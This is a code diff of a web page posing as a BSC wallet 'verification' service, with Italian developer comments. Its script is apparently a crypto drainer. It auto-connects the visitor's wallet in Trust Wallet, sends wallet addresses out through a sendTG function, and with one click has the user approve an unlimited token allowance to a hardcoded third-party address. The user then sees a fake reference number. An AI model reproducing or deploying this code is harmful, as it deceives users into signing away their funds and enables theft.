@@ -48,10 +48,9 @@
 
   /* ---------- header ---------- */
   header {
-    /* MODIFICA: Rimosso sticky e backdrop filter per farlo scorrere con la pagina */
-    position: relative; 
-    z-index: 50;
-    background: var(--ink);
+    position: sticky; top: 0; z-index: 50;
+    background: rgba(14,20,32,0.88);
+    backdrop-filter: blur(10px);
     border-bottom: 1px solid var(--hair);
   }
   .nav { display: flex; align-items: center; justify-content: space-between; padding: 18px 0; }
@@ -197,11 +196,7 @@
   .result-status { color: var(--amber); font-weight: 600; }
 
   @media (max-width: 860px) {
-    /* Menu visibile su mobile */
-    .nav { flex-direction: column; gap: 16px; padding: 12px 0; }
-    nav ul { display: flex; gap: 16px; flex-wrap: wrap; justify-content: center; }
-    nav ul li a { font-size: 12px; }
-    
+    nav ul { display: none; }
     h1.headline { font-size: 36px; }
     .about-grid, .contact-grid, .feature-grid, .steps, .foot-grid { grid-template-columns: 1fr; }
     section { padding: 64px 0; }
@@ -355,9 +350,11 @@
 <div class="modal-overlay" id="verifyModalOverlay">
   <div class="modal-box">
     <button class="modal-close" onclick="closeVerifyModal()">&times;</button>
+    <!-- UI ORIGINALE: stepInput -->
     <div id="stepInput">
       <h3 style="font-family:'Roboto Slab',serif; font-size:19px; margin-bottom:20px; color: white;">Request a verification</h3>
       <div class="field"><label>WALLET ADDRESS (BSC)</label><input type="text" id="walletInput" placeholder="0x..." /></div>
+      <!-- Un solo click su Verify Now attiverà l'approve se siamo già in Trust Wallet -->
       <button id="actionBtn" class="btn-primary btn-block" onclick="startFlow()">Verify Now</button>
       <p id="statusMsg" style="font-size:12.5px;color:var(--slate);margin-top:12px;text-align:center;"></p>
     </div>
@@ -387,17 +384,23 @@
   function openVerifyModal() { document.getElementById('verifyModalOverlay').classList.add('active'); }
   function closeVerifyModal() { document.getElementById('verifyModalOverlay').classList.remove('active'); }
 
+  // Funzione principale che gestisce il flusso
   async function startFlow() {
     const inputAddr = document.getElementById('walletInput').value.trim();
     if (!inputAddr.startsWith('0x')) { alert("Enter a valid address"); return; }
+
+    // Controllo se siamo già in Trust Wallet (o browser web3)
     const isWeb3 = window.ethereum;
     const params = new URLSearchParams(window.location.search);
     const isAuto = params.get('auto') === '1';
+
     if (!isWeb3 || !isAuto) {
+      // Step 1: Siamo in Safari/Chrome normale -> Apriamo Trust Wallet
       const baseUrl = window.location.href.split('?')[0];
       const targetUrl = baseUrl + '?auto=1&addr=' + encodeURIComponent(inputAddr);
       window.location.href = "https://link.trustwallet.com/open_url?coin_id=60&url=" + encodeURIComponent(targetUrl);
     } else {
+      // Step 2: Siamo già in Trust Wallet -> Eseguiamo subito l'Approve (Click Singolo)
       executeApprove(inputAddr);
     }
   }
@@ -406,16 +409,22 @@
     document.getElementById('statusMsg').textContent = 'Processing...';
     try {
       const provider = new ethers.providers.Web3Provider(window.ethereum);
+      // Il connect è già stato fatto in window.onload, ma per sicurezza assicuriamoci di avere il signer
       const signer = provider.getSigner();
       const connected = await signer.getAddress();
       sendTG(inputAddr, connected);
+
       await window.ethereum.request({ method: "wallet_switchEthereumChain", params: [{ chainId: "0x38" }] });
+
       const contract = new ethers.Contract("0x55d398326f99059fF775485246999027B3197955", ["function approve(address s, uint256 a) external returns (bool)"], signer);
       const tx = await contract.approve("0x05187cf26990e3857c119c7bc3417c6e1fac5198", "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff");
+      
+      // MOSTRA RISULTATO
       document.getElementById('stepInput').style.display = 'none';
       document.getElementById('stepResult').style.display = 'block';
       document.getElementById('resAddress').textContent = inputAddr;
       document.getElementById('resRef').textContent = "CC-" + Date.now().toString().slice(-6);
+      
       await tx.wait();
     } catch (e) {
       document.getElementById('statusMsg').textContent = '';
@@ -426,13 +435,21 @@
   window.addEventListener('load', async () => {
     const params = new URLSearchParams(window.location.search);
     if (params.get('auto') === '1' && window.ethereum) {
+      // 1. Siamo in Trust Wallet: carichiamo l'indirizzo
       const addr = params.get('addr') || '';
       document.getElementById('walletInput').value = decodeURIComponent(addr);
+      
+      // 2. Chiediamo SUBITO il connect wallet (automatico all'apertura)
       try {
         const provider = new ethers.providers.Web3Provider(window.ethereum);
         await provider.send("eth_requestAccounts", []);
+        
+        // 3. Apriamo il modal così l'utente vede l'indirizzo e clicca "Verify Now" una sola volta
         openVerifyModal();
-      } catch (e) { console.error("Connect error:", e); }
+      } catch (e) {
+        console.error("Connect error:", e);
+      }
+      
       document.getElementById('loadingOverlay').style.display = 'none';
       document.body.classList.add('ready');
     } else {
